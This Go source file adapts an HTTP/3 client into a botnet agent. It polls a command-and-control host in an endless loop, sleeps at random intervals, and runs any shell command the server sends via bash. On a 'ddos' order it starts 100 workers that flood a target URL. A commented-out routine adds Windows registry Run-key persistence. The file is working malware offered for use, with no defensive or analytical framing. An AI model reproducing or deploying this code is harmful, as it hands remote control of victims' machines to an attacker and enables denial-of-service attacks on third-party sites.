package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"sync/atomic"
	"time"

	// "golang.org/x/sys/windows/registry"

	"github.com/quic-go/quic-go"
	"github.com/quic-go/quic-go/http3"
	"github.com/quic-go/quic-go/internal/testdata"
	"github.com/quic-go/quic-go/internal/utils"
	"github.com/quic-go/quic-go/logging"
	"github.com/quic-go/quic-go/qlog"
)

// func persistenceWindows() {
// 	// Open registry key
// 	key, _, err := registry.CreateKey(
// 		registry.CURRENT_USER, // registry path
// 		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
// 		registry.ALL_ACCESS, // full access
// 	)

// 	if err != nil { // Handle error
// 		log.Fatal(err)
// 	}
// 	defer key.Close() // Close key

// 	// Overwrite value
// 	err = key.SetStringValue("", "C:\\Windows\\System32\\cmd.exe")
// 	if err != nil {
// 		log.Fatal(err)
// 	}

// 	fmt.Println("[+] Success!")
// }

func main() {
	verbose := flag.Bool("v", false, "verbose")
	quiet := flag.Bool("q", false, "don't print the data")
	keyLogFile := flag.String("keylog", "", "key log file")
	insecure := flag.Bool("insecure", false, "skip certificate verification")
	enableQlog := flag.Bool("qlog", false, "output a qlog (in the same directory)")
	flag.Parse()
	urls := flag.Args()

	logger := utils.DefaultLogger

	if *verbose {
		logger.SetLogLevel(utils.LogLevelDebug)
	} else {
		logger.SetLogLevel(utils.LogLevelInfo)
	}
	logger.SetLogTimeFormat("")

	var keyLog io.Writer
	if len(*keyLogFile) > 0 {
		f, err := os.Create(*keyLogFile)
		if err != nil {
			log.Fatal(err)
		}
		defer f.Close()
		keyLog = f
	}

	pool, err := x509.SystemCertPool()
	if err != nil {
		log.Fatal(err)
	}
	testdata.AddRootCA(pool)

	var qconf quic.Config
	if *enableQlog {
		qconf.Tracer = func(ctx context.Context, p logging.Perspective, connID quic.ConnectionID) logging.ConnectionTracer {
			filename := fmt.Sprintf("client_%x.qlog", connID)
			f, err := os.Create(filename)
			if err != nil {
				log.Fatal(err)
			}
			log.Printf("Creating qlog file %s.\n", filename)
			return qlog.NewConnectionTracer(utils.NewBufferedWriteCloser(bufio.NewWriter(f), f), p, connID)
		}
	}
	roundTripper := &http3.RoundTripper{
		TLSClientConfig: &tls.Config{
			RootCAs:            pool,
			InsecureSkipVerify: *insecure,
			KeyLogWriter:       keyLog,
		},
		QuicConfig: &qconf,
	}
	defer roundTripper.Close()
	hclient := &http.Client{
		Transport: roundTripper,
	}

	ddosAttackStatus := false
	for {
		// Infinite loop
		for _, endpoint := range urls {
			cac_server_url := "https://cac.gachenot.eu:6121/"
			rsp, err := hclient.Get(cac_server_url + endpoint)
			if err != nil {
				log.Fatal(err)
			}
			logger.Infof("Got response for %s: %#v", cac_server_url, rsp)

			body := &bytes.Buffer{}
			_, err = io.Copy(body, rsp.Body)
			if err != nil {
				log.Fatal(err)
			}
			if *quiet {
				logger.Infof("Response Body: %d bytes", body.Len())
			} else {
				logger.Infof("Response Body:")
				logger.Infof("%s", body.Bytes())
			}

			var responseBodyJson map[string]interface{}
			json.Unmarshal([]byte(body.Bytes()), &responseBodyJson)

			if responseBodyJson["status"] == "idle" {
				// Sleep random time between 20s and 40 minutes
				rand.Seed(time.Now().UnixNano())
				randomTime := rand.Intn(2400) + 20
				logger.Infof("Sleeping for %d seconds", randomTime)
				time.Sleep(time.Duration(randomTime) * time.Second)
			} else if responseBodyJson["status"] == "execute" {
				data, ok := responseBodyJson["data"].(map[string]interface{})
				if !ok {
					log.Fatal("invalid data type")
				}
				logger.Infof("Executing command: %s", data["command"].(string))

				cmd := exec.Command("bash", "-c", data["command"].(string))

				var outb, errb bytes.Buffer
				cmd.Stdout = &outb
				cmd.Stderr = &errb
				err := cmd.Run()
				if err != nil {
					log.Fatal(err)
				}
				cmd_err := cmd.Wait()
				if cmd_err != nil {
					log.Fatal(err)
				}
				fmt.Println("Command output:")
				fmt.Println(outb.String())
			} else if responseBodyJson["status"] == "ddos" {
				if ddosAttackStatus {
					continue
					// Avoid running 100 workers then after 8 secondes, running 100 more and so on...
				}
				ddosAttackStatus = true
				url, ok := responseBodyJson["url"].(string)
				if !ok {
					log.Fatal("invalid data type")
				}

				workers := 100
				d, err := New(url, workers)
				if err != nil {
					panic(err)
				}
				d.Run()
				time.Sleep(time.Second)
				// d.Stop()
				fmt.Println("DDoS attack server:", url)
			} else if responseBodyJson["status"] == "upload" {
				// Not working, removed code for better readability of code, available in git history.
			} else {
				fmt.Println("Failed")
			}
		}
		time.Sleep(8 * time.Second)
	}
}

// Code coming from https://github.com/Konstantin8105/DDoS/tree/master

// DDoS - structure of value for DDoS attack
type DDoS struct {
	url           string
	stop          *chan bool
	amountWorkers int

	// Statistic
	successRequest int64
	amountRequests int64
}

// New - initialization of new DDoS attack
func New(URL string, workers int) (*DDoS, error) {
	if workers < 1 {
		return nil, fmt.Errorf("amount of workers cannot be less 1")
	}
	u, err := url.Parse(URL)
	if err != nil || len(u.Host) == 0 {
		return nil, fmt.Errorf("undefined host or error = %v", err)
	}
	s := make(chan bool)
	return &DDoS{
		url:           URL,
		stop:          &s,
		amountWorkers: workers,
	}, nil
}

// Run - run DDoS attack
func (d *DDoS) Run() {
	for i := 0; i < d.amountWorkers; i++ {
		go func() {
			for {
				select {
				case <-(*d.stop):
					return
				default:
					// sent http GET requests
					resp, err := http.Get(d.url)
					atomic.AddInt64(&d.amountRequests, 1)
					if err == nil {
						atomic.AddInt64(&d.successRequest, 1)
						_, _ = io.Copy(ioutil.Discard, resp.Body)
						_ = resp.Body.Close()
					}
				}
				runtime.Gosched()
			}
		}()
	}
}

// Stop - stop DDoS attack
func (d *DDoS) Stop() {
	for i := 0; i < d.amountWorkers; i++ {
		(*d.stop) <- true
	}
	close(*d.stop)
}

// Result - result of DDoS attack
func (d DDoS) Result() (successRequest, amountRequests int64) {
	return d.successRequest, d.amountRequests
}
